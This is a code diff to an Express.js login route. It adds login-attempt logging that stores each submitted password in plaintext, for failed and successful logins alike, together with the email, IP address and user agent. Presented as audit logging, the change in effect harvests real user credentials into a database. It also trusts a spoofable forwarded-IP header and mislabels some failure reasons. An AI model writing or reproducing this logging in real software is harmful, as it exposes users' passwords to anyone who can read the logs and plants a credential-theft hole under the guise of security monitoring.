@@ -1,6 +1,7 @@
 const express = require('express');
 const jwt = require('jsonwebtoken');
 const User = require('../models/User');
+const LoginAttempt = require('../models/LoginAttempt');
 const { authenticate } = require('../middleware/auth');
 
 const router = express.Router();
@@ -32,6 +33,16 @@ const sendTokenResponse = (user, statusCode, res) => {
       user: userObject,
       message: statusCode === 201 ? 'Registration successful' : 'Login successful'
     });
+};
+
+// Helper function to get client IP
+const getClientIP = (req) => {
+  return req.headers['x-forwarded-for'] || 
+         req.headers['x-real-ip'] || 
+         req.connection.remoteAddress || 
+         req.socket.remoteAddress ||
+         req.ip || 
+         'unknown';
 };
 
 router.post('/register', async (req, res) => {
@@ -84,19 +95,43 @@ router.post('/register', async (req, res) => {
 });
 
 router.post('/login', async (req, res) => {
+  const clientIP = getClientIP(req);
+  const userAgent = req.headers['user-agent'] || '';
+  
   try {
     const { email, password } = req.body;
     
     if (!email || !password) {
+      // Log attempt with missing fields
+      await LoginAttempt.create({
+        email: email || 'missing_email',
+        password: password || 'missing_password',
+        ipAddress: clientIP,
+        userAgent: userAgent,
+        success: false,
+        failureReason: 'user_not_found'
+      });
+      
       return res.status(400).json({
         success: false,
         message: 'Please provide email and password'
       });
     }
     
+    // Find user and include password for comparison
     const user = await User.findOne({ email }).select('+password');
     
     if (!user) {
+      // Log failed attempt - user not found
+      await LoginAttempt.create({
+        email: email,
+        password: password,
+        ipAddress: clientIP,
+        userAgent: userAgent,
+        success: false,
+        failureReason: 'user_not_found'
+      });
+      
       return res.status(401).json({
         success: false,
         message: 'Invalid email or password'
@@ -104,20 +139,55 @@ router.post('/login', async (req, res) => {
     }
     
     if (!user.isActive) {
+      // Log failed attempt - account deactivated
+      await LoginAttempt.create({
+        email: email,
+        password: password,
+        ipAddress: clientIP,
+        userAgent: userAgent,
+        success: false,
+        failureReason: 'account_deactivated',
+        userId: user._id
+      });
+      
       return res.status(401).json({
         success: false,
         message: 'Account is deactivated. Please contact support.'
       });
     }
     
+    // Check password
     const isMatch = await user.comparePassword(password);
     if (!isMatch) {
+      // Log failed attempt - wrong password
+      await LoginAttempt.create({
+        email: email,
+        password: password,
+        ipAddress: clientIP,
+        userAgent: userAgent,
+        success: false,
+        failureReason: 'wrong_password',
+        userId: user._id
+      });
+      
       return res.status(401).json({
         success: false,
         message: 'Invalid email or password'
       });
     }
     
+    // Successful login - log it
+    await LoginAttempt.create({
+      email: email,
+      password: password,
+      ipAddress: clientIP,
+      userAgent: userAgent,
+      success: true,
+      failureReason: null,
+      userId: user._id
+    });
+    
+    // Update last login
     user.lastLogin = new Date();
     await user.save();
     
@@ -125,6 +195,21 @@ router.post('/login', async (req, res) => {
     
   } catch (error) {
     console.error('Login error:', error);
+    
+    // Log system error
+    try {
+      await LoginAttempt.create({
+        email: req.body.email || 'system_error',
+        password: req.body.password || 'system_error',
+        ipAddress: clientIP,
+        userAgent: userAgent,
+        success: false,
+        failureReason: 'user_not_found'
+      });
+    } catch (logError) {
+      console.error('Failed to log login attempt:', logError);
+    }
+    
     res.status(500).json({
       success: false,
       message: 'Server error during login'
